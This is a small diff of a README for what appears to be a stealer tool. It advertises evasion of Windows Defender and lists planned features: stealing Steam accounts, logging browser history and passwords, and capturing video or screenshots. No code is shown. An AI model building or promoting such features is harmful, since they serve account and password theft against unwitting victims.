@@ -16,7 +16,7 @@ Check Out https://github.com/JustHarryTools
         🟣NOT DETECTED BY WINDOWS DEFENDER AND SOME OTHER ANTI VIRUSES
          
 # To Do
-	   💎Better settings
+	    💎Better settings
         💎Steam Stealer
         💎Logging Browser History and Passwords
         💎Record Video or Take Screenshot
